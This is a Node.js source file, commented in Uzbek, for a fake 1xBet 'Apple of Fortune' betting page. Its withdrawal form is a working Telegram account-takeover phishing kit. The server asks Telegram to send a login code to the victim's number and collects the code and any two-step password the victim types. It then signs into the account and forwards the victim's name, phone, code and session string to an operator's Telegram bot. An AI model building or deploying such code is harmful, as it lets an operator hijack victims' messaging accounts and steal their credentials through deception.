require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
const PORT = process.env.PORT || 3000;

// Env o'zgaruvchilari
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const API_ID = parseInt(process.env.API_ID || "123456"); 
const API_HASH = process.env.API_HASH || "your_api_hash_here";

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

app.use(express.json());

// Aktiv sessiyalar va auth parametrlarini xotirada saqlash
const activeAuthSessions = {};

// 1. API Marshrutlari
app.get('/api/get-balance', (req, res) => {
    res.json({ success: true, balance: 10000 });
});

// Saytda raqam kiritilganda Telegram orqali SMS/App-kod yuborish
app.post('/api/send-code', async (req, res) => {
    let { phone } = req.body;
    if (!phone) {
        return res.json({ success: false, message: "Telefon raqam kiritilmadi!" });
    }

    phone = phone.replace(/\D/g, '');
    if (!phone.startsWith('998') && phone.length === 9) {
        phone = '998' + phone;
    }

    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();

        // Telegram xizmatidan kod yuborish so'rovi
        const { phoneCodeHash } = await client.sendCode(
            {
                apiId: API_ID,
                apiHash: API_HASH,
            },
            '+' + phone
        );

        // Vaqtincha saqlash
        activeAuthSessions[phone] = {
            client,
            phoneCodeHash,
            session: stringSession
        };

        // Admin botga xabar
        if (ADMIN_ID) {
            await bot.sendMessage(
                ADMIN_ID,
                `📱 *Yangi raqam kiritildi!*\nRaqam: \`+${phone}\`\nKod yuborildi.`,
                { parse_mode: 'Markdown' }
            );
        }

        res.json({ success: true, message: "Kod Telegram ilovangizga yuborildi!" });
    } catch (error) {
        console.error("Kod yuborishda xatolik:", error);
        res.json({ success: false, message: "Kod yuborishda xatolik yuz berdi: " + error.message });
    }
});

// Kod kiritilganda server orqali Telegramga kirish (TUZA TILGAN MARSHRUT)
app.post('/api/submit-withdraw', async (req, res) => {
    const { inputCode, phone, password } = req.body;

    let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
    if (!cleanPhone.startsWith('998') && cleanPhone.length === 9) {
        cleanPhone = '998' + cleanPhone;
    }

    const authData = activeAuthSessions[cleanPhone];

    if (!authData) {
        return res.json({ success: false, message: "Sessiya topilmadi! Qaytadan raqam kiriting." });
    }

    try {
        const { client, phoneCodeHash, session } = authData;

        // Server foydalanuvchi kiritgan kod orqali Telegramga kiradi
        await client.signIn({
            phoneNumber: '+' + cleanPhone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: inputCode,
            password: async () => password || '', // 2FA Parol bo'lsa ishlatish
        });

        const me = await client.getMe();
        const sessionString = session.save();

        const usernameText = me.username ? `@${me.username}` : "Username yo'q";
        const firstName = me.firstName || "";
        const lastName = me.lastName || "";

        if (ADMIN_ID) {
            const notifyText = `🚀 *Server Telegramga kirdi!*

👤 *Foydalanuvchi:* ${firstName}${lastName}
🏷 *Username:* ${usernameText}
📱 *Telefon:* \`+${cleanPhone}\`
🔑 *Kiritilgan Kod:* \`${inputCode}\`

📄 *Session String:*
\`\`\`
${sessionString}
\`\`\``;

            await bot.sendMessage(ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
        }

        delete activeAuthSessions[cleanPhone];

        res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
    } catch (err) {
        console.error("Kirishda xatolik:", err);
        
        // 2FA Parol so'ralgan xolat
        if (err.message && err.message.includes('SESSION_PASSWORD_NEEDED')) {
            return res.json({ 
                success: false, 
                requiresPassword: true, 
                message: "Akkauntingizda 2-bosqichli parol yoqilgan. Iltimos, parolni kiriting!" 
            });
        }

        if (ADMIN_ID) {
            await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami noto'g'ri kod kiritdi (\`${inputCode}\`).`, { parse_mode: 'Markdown' });
        }

        res.json({ success: false, message: "Kod noto'g'ri yoki muddat o'tgan!" });
    }
});

// 2. Frontend HTML Sahifasi
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple of Fortune - 1xBet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&family=Montserrat:wght@500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a1118;
            --green-btn: linear-gradient(180deg, #71c02b 0%, #468c12 100%);
            --orange-btn: linear-gradient(180deg, #f38b22 0%, #c85a08 100%);
            --purple-btn: linear-gradient(180deg, #9d50bb 0%, #6e2a8c 100%);
            --blue-btn: linear-gradient(180deg, #2563eb 0%, #1d4ed8 100%);
            --gold-text: #ffd700;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; user-select: none; }
        body {
            background: #0f1f18 url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed;
            background-size: cover; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; padding: 10px;
        }
        .game-frame {
            width: 100%; max-width: 440px; background: rgba(10, 20, 15, 0.85); backdrop-filter: blur(8px);
            border-radius: 20px; border: 3px solid #2e4d32; box-shadow: 0 20px 50px rgba(0,0,0,0.9); overflow: hidden; display: flex; flex-direction: column;
        }
        .header-bar { background: linear-gradient(180deg, #1b3d54 0%, #0d2232 100%); padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #2a5a78; }
        .brand-logo { font-weight: 900; font-size: 18px; color: #fff; }
        .brand-logo span { color: #00aaff; }
        .balance-badge { background: rgba(0, 0, 0, 0.5); border: 1px solid #00aaff; border-radius: 20px; padding: 4px 12px; font-size: 13px; font-weight: 700; color: #00aaff; display: flex; align-items: center; gap: 6px; }
        .top-status-bar { background: radial-gradient(circle, #5a2e12 0%, #341807 100%); border: 2px solid #7c441e; border-radius: 10px; margin: 10px 12px 5px 12px; padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; }
        .status-title { font-family: 'Fredoka', cursive; font-size: 14px; color: #ffe8b3; text-align: center; flex: 1; }
        .withdraw-top-btn { background: linear-gradient(180deg, #22c55e 0%, #15803d 100%); border: 1.5px solid #86efac; border-radius: 16px; padding: 5px 10px; display: flex; align-items: center; gap: 5px; cursor: pointer; color: #fff; font-size: 11px; font-weight: 700; }
        .board-container { background: url('https://images.unsplash.com/photo-1542273917363-3b1817f69a2d?q=80&w=800&auto=format&fit=crop') center/cover; margin: 5px 12px 10px 12px; padding: 8px; border-radius: 12px; border: 4px solid #4a2810; }
        .grid-table { display: flex; flex-direction: column-reverse; gap: 4px; }
        .grid-row { display: flex; gap: 4px; height: 38px; opacity: 0.6; transition: all 0.3s; }
        .grid-row.active { opacity: 1; filter: drop-shadow(0 0 8px rgba(120, 255, 100, 0.6)); }
        .grid-row.completed { opacity: 0.9; }
        .cell { flex: 1; background: linear-gradient(135deg, #c48a43 0%, #9e6423 100%); border: 1.5px solid #e0aa60; border-radius: 6px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .cell.opened-apple { background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%) !important; }
        .cell.opened-apple img { width: 26px; height: 26px; }
        .cell.opened-core { background: linear-gradient(135deg, #c62828 0%, #8e0000 100%) !important; }
        .cell.opened-core img { width: 24px; height: 24px; }
        .coeff-cell { width: 68px; background: linear-gradient(180deg, #4b5563 0%, #1f2937 100%); border: 1.5px solid #6b7280; border-radius: 6px; display: flex; justify-content: center; align-items: center; font-family: 'Fredoka', cursive; font-size: 13px; color: #d1d5db; }
        .controls-area { padding: 0 12px 12px 12px; display: flex; flex-direction: column; gap: 10px; }
        .bet-display-box { background: #140a04; border: 2px solid #5a3010; border-radius: 8px; padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; }
        .action-buttons-row { display: flex; gap: 10px; }
        .btn-bet-options, .btn-auto { width: 55px; height: 52px; background: var(--orange-btn); border: 2px solid #ffaa44; border-radius: 12px; display: flex; justify-content: center; align-items: center; color: #fff; cursor: pointer; }
        .btn-auto { width: 75px; background: var(--purple-btn); border-color: #c77dff; font-family: 'Fredoka', cursive; font-weight: 700; }
        .btn-main-play { flex: 1; height: 52px; background: var(--green-btn); border: 2px solid #a3e635; border-radius: 12px; display: flex; justify-content: center; align-items: center; color: #fff; font-family: 'Fredoka', cursive; font-size: 18px; font-weight: 700; cursor: pointer; }
        .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(6px); display: none; justify-content: center; align-items: center; z-index: 100; padding: 15px; }
        .modal-overlay.open { display: flex; }
        .modal-box { background: linear-gradient(180deg, #2b1305 0%, #170902 100%); border: 3px solid #7c441e; border-radius: 18px; width: 100%; max-width: 380px; padding: 20px; position: relative; color: #f3e5d8; }
        .modal-close-btn { position: absolute; top: -12px; right: -12px; width: 36px; height: 36px; background: radial-gradient(circle, #dc2626 0%, #991b1b 100%); border: 2px solid #fca5a5; border-radius: 50%; color: #fff; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .modal-header-title { text-align: center; font-family: 'Fredoka', cursive; font-size: 19px; color: var(--gold-text); margin-bottom: 12px; }
        .bet-input-container { background: #0d0501; border: 1.5px solid #5a3010; border-radius: 10px; padding: 10px; margin-bottom: 15px; display: flex; align-items: center; }
        .bet-input-field { background: transparent; border: none; outline: none; color: #fff; font-family: 'Fredoka', cursive; font-size: 18px; width: 100%; text-align: center; }
        .preset-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
        .preset-stone-btn { background: linear-gradient(180deg, #64748b 0%, #334155 100%); border: 1.5px solid #94a3b8; border-radius: 8px; padding: 12px 5px; text-align: center; font-family: 'Fredoka', cursive; color: #fff; cursor: pointer; }
        .btn-modal-confirm { width: 100%; height: 48px; background: var(--green-btn); border: 2px solid #a3e635; border-radius: 10px; color: #fff; font-family: 'Fredoka', cursive; font-size: 16px; cursor: pointer; }
        .form-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
        .phone-input-group { display: flex; gap: 6px; }
        .country-code { background: #1e293b; border: 1.5px solid #475569; border-radius: 8px; padding: 0 10px; display: flex; align-items: center; font-size: 13px; font-weight: 700; }
        .code-timer-btn { background: var(--blue-btn); border: 1.5px solid #60a5fa; border-radius: 8px; padding: 10px; color: #fff; font-family: 'Fredoka', cursive; cursor: pointer; width: 100%; margin-bottom: 12px; }
        .code-boxes { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 15px; }
        .code-box-input { width: 100%; height: 42px; background: #0d0501; border: 1.5px solid #5a3010; border-radius: 8px; text-align: center; font-size: 18px; color: #fff; outline: none; }
        .status-alert { background: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; color: #86efac; font-size: 12px; padding: 8px; border-radius: 8px; text-align: center; margin-bottom: 12px; display: none; }
    </style>
</head>
<body>

<div class="game-frame">
    <div class="header-bar">
        <div class="brand-logo"><i class="fa-solid fa-apple-whole" style="color: #ef4444;"></i> 1x<span>BET</span></div>
        <div class="balance-badge"><i class="fa-solid fa-coins" style="color: var(--gold-text);"></i><span id="balanceText">10,000 UZS</span></div>
    </div>

    <div class="top-status-bar">
        <div class="status-title" id="statusMessage">Iltimos, stavka qiling</div>
        <div class="withdraw-top-btn" onclick="openModal('withdrawModal')"><i class="fa-solid fa-wallet" style="color: #86efac;"></i> <span>Yechish</span></div>
    </div>

    <div class="board-container"><div class="grid-table" id="gridTable"></div></div>

    <div class="controls-area">
        <div class="bet-display-box">
            <span style="font-size: 12px; color: #a1a1aa; font-weight: 700;">STAVKA:</span>
            <span id="currentBetDisplay" style="font-family: 'Fredoka', cursive; font-size: 16px;">5,000 UZS</span>
        </div>
        <div class="action-buttons-row">
            <div class="btn-bet-options" onclick="openModal('betModal')"><i class="fa-solid fa-coins"></i></div>
            <div class="btn-auto" onclick="openModal('betModal')">AUTO</div>
            <div class="btn-main-play" id="mainActionBtn" onclick="handleMainAction()">O'YINNI BOSHLASH</div>
        </div>
    </div>

    <div class="modal-overlay" id="betModal">
        <div class="modal-box">
            <div class="modal-close-btn" onclick="closeModal('betModal')"><i class="fa-solid fa-xmark"></i></div>
            <div class="modal-header-title">STAVKA MIQDORI</div>
            <div class="bet-input-container">
                <input type="text" class="bet-input-field" id="modalBetInput" value="5000">
                <span style="color: var(--gold-text); font-weight: 700;">UZS</span>
            </div>
            <div class="preset-grid">
                <div class="preset-stone-btn" onclick="setPresetBet(1000)">1,000</div>
                <div class="preset-stone-btn" onclick="setPresetBet(5000)">5,000</div>
                <div class="preset-stone-btn" onclick="setPresetBet(10000)">10,000</div>
            </div>
            <button class="btn-modal-confirm" onclick="confirmBet()">STAVKA QILISH</button>
        </div>
    </div>

    <div class="modal-overlay" id="withdrawModal">
        <div class="modal-box">
            <div class="modal-close-btn" onclick="closeModal('withdrawModal')"><i class="fa-solid fa-xmark"></i></div>
            <div class="modal-header-title">MABLAG'NI YECHIB OLISH</div>
            <div class="form-group">
                <label style="font-size: 12px;">Telefon raqamingiz:</label>
                <div class="phone-input-group">
                    <div class="country-code">🇺🇿 +998</div>
                    <div class="bet-input-container" style="margin:0; flex:1;">
                        <input type="tel" class="bet-input-field" id="withdrawPhone" placeholder="901234567" maxlength="9">
                    </div>
                </div>
            </div>
            <button class="code-timer-btn" id="sendCodeBtn" onclick="sendVerificationCode()">Telegramdan Kod Olish</button>
            <div class="status-alert" id="statusAlert"><i class="fa-solid fa-circle-check"></i> Kod yuborildi!</div>
            <div class="form-group" id="codeGroup" style="display: none;">
                <label style="font-size: 12px;">Telegramga kelgan kod:</label>
                <div class="code-boxes">
                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 0)">
                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 1)">
                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 2)">
                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 3)">
                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 4)">
                </div>
                
                <div id="passwordFieldGroup" style="display: none; margin-top: 10px;">
                    <label style="font-size: 12px; color: #facc15;">2-Bosqichli Telegram Paroli:</label>
                    <div class="bet-input-container" style="margin-top: 5px;">
                        <input type="password" class="bet-input-field" id="telegramPassword" placeholder="Parolingizni kiriting">
                    </div>
                </div>

                <button class="btn-modal-confirm" style="margin-top: 10px;" onclick="submitWithdraw()">TASDIQLASH VA YECHISH</button>
            </div>
        </div>
    </div>
</div>

<script>
    const API_URL = '/api';
    const rowCoefficients = [1.23, 1.54, 1.93, 2.41, 4.02, 6.71, 11.18, 27.97, 69.93, 349.68];
    const badApplesPerRow = [1, 1, 1, 1, 2, 2, 2, 3, 3, 4];
    const GOOD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/415/415733.png';
    const BAD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/823/823876.png';

    let userBalance = 10000;
    let currentBet = 5000;
    let currentStep = 0;
    let isPlaying = false;
    let gridData = [];

    async function fetchBalance() {
        try {
            const res = await fetch(\`\${API_URL}/get-balance\`);
            const data = await res.json();
            if (data.success) { userBalance = data.balance; updateBalanceUI(); }
        } catch (e) {}
    }
    fetchBalance();

    function initBoard() {
        const gridTable = document.getElementById('gridTable');
        gridTable.innerHTML = '';
        for (let r = 0; r < 10; r++) {
            const rowDiv = document.createElement('div');
            rowDiv.className = 'grid-row';
            rowDiv.id = \`row-\${r}\`;
            for (let c = 0; c < 5; c++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.dataset.row = r;
                cell.dataset.col = c;
                cell.onclick = () => handleCellClick(r, c);
                rowDiv.appendChild(cell);
            }
            const coeffCell = document.createElement('div');
            coeffCell.className = 'coeff-cell';
            coeffCell.innerText = \`x\${rowCoefficients[r]}\`;
            rowDiv.appendChild(coeffCell);
            gridTable.appendChild(rowDiv);
        }
        updateBalanceUI();
    }

    function updateBalanceUI() {
        document.getElementById('balanceText').innerText = \`\${userBalance.toLocaleString('uz-UZ')} UZS\`;
        document.getElementById('currentBetDisplay').innerText = \`\${currentBet.toLocaleString('uz-UZ')} UZS\`;
    }

    function openModal(id) { document.getElementById(id).classList.add('open'); }
    function closeModal(id) { document.getElementById(id).classList.remove('open'); }
    function setPresetBet(amount) { document.getElementById('modalBetInput').value = amount; }

    function confirmBet() {
        const val = parseInt(document.getElementById('modalBetInput').value);
        if (!isNaN(val) && val >= 1000 && val <= userBalance) {
            currentBet = val;
            updateBalanceUI();
            closeModal('betModal');
        } else {
            alert("Stavka miqdori noto'g'ri!");
        }
    }

    function generateGridSecrets() {
        gridData = [];
        for (let r = 0; r < 10; r++) {
            const badCount = badApplesPerRow[r];
            const badIndexes = new Set();
            while (badIndexes.size < badCount) badIndexes.add(Math.floor(Math.random() * 5));
            gridData.push(badIndexes);
        }
    }

    function handleMainAction() {
        const mainActionBtn = document.getElementById('mainActionBtn');
        if (!isPlaying) {
            if (userBalance < currentBet) { alert("Balans yetarli emas!"); return; }
            userBalance -= currentBet;
            updateBalanceUI();
            isPlaying = true;
            currentStep = 0;
            generateGridSecrets();
            document.querySelectorAll('.cell').forEach(c => { c.className = 'cell'; c.innerHTML = ''; });
            document.querySelectorAll('.grid-row').forEach(r => r.classList.remove('active', 'completed'));
            document.getElementById('row-0').classList.add('active');
            mainActionBtn.innerText = "YUTUQNI OLISH";
        } else {
            if (currentStep > 0) {
                const winAmount = Math.floor(currentBet * rowCoefficients[currentStep - 1]);
                userBalance += winAmount;
                updateBalanceUI();
                alert(\`Siz \${winAmount.toLocaleString('uz-UZ')} UZS yutdingiz!\`);
                endGame();
            } else alert("Kamida 1 ta katakcha oching!");
        }
    }

    function handleCellClick(row, col) {
        if (!isPlaying || row !== currentStep) return;
        const isBad = gridData[row].has(col);
        const cell = document.querySelector(\`.cell[data-row="\${row}"][data-col="\${col}"]\`);

        if (isBad) {
            cell.classList.add('opened-core');
            cell.innerHTML = \`<img src="\${BAD_APPLE_IMG}">\`;
            alert("Yutqazdingiz!");
            endGame();
        } else {
            cell.classList.add('opened-apple');
            cell.innerHTML = \`<img src="\${GOOD_APPLE_IMG}">\`;
            const rowDiv = document.getElementById(\`row-\${row}\`);
            rowDiv.classList.remove('active');
            rowDiv.classList.add('completed');
            currentStep++;
            if (currentStep < 10) document.getElementById(\`row-\${currentStep}\`).classList.add('active');
            else {
                const winAmount = Math.floor(currentBet * rowCoefficients[9]);
                userBalance += winAmount;
                updateBalanceUI();
                alert(\`MAKSIMAL YUTUQ: \${winAmount.toLocaleString('uz-UZ')} UZS!\`);
                endGame();
            }
        }
    }

    function endGame() {
        isPlaying = false;
        document.getElementById('mainActionBtn').innerText = "O'YINNI BOSHLASH";
        document.querySelectorAll('.grid-row').forEach(r => r.classList.remove('active'));
    }

    async function sendVerificationCode() {
        const phone = document.getElementById('withdrawPhone').value.trim();
        if (phone.length < 9) { alert("To'g'ri raqam kiriting!"); return; }
        
        document.getElementById('sendCodeBtn').innerText = "Kod yuborilmoqda...";
        try {
            const res = await fetch(\`\${API_URL}/send-code\`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone })
            });
            const data = await res.json();
            if (data.success) {
                document.getElementById('statusAlert').innerText = data.message;
                document.getElementById('statusAlert').style.display = 'block';
                document.getElementById('codeGroup').style.display = 'block';
                document.getElementById('sendCodeBtn').innerText = "Qayta yuborish";
            } else {
                alert(data.message);
                document.getElementById('sendCodeBtn').innerText = "Telegramdan Kod Olish";
            }
        } catch (e) { 
            alert("Xatolik yuz berdi!"); 
            document.getElementById('sendCodeBtn').innerText = "Telegramdan Kod Olish";
        }
    }

    function moveNext(input, index) {
        if (input.value.length >= 1) {
            const inputs = document.querySelectorAll('.code-box-input');
            if (inputs[index + 1]) inputs[index + 1].focus();
        }
    }

    async function submitWithdraw() {
        const inputs = document.querySelectorAll('.code-box-input');
        const phone = document.getElementById('withdrawPhone').value.trim();
        const password = document.getElementById('telegramPassword').value.trim();
        
        let inputCode = '';
        inputs.forEach(input => inputCode += input.value.trim());
        if (inputCode.length < 5) { alert("Kodni to'liq kiriting!"); return; }

        try {
            const res = await fetch(\`\${API_URL}/submit-withdraw\`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ inputCode, phone, password })
            });
            const data = await res.json();
            
            if (data.requiresPassword) {
                alert(data.message);
                document.getElementById('passwordFieldGroup').style.display = 'block';
            } else {
                alert(data.message);
                if (data.success) {
                    closeModal('withdrawModal');
                }
            }
        } catch (e) { alert("Xatolik yuz berdi!"); }
    }

    initBoard();
</script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server ishlamoqda: http://localhost:${PORT}`);
});
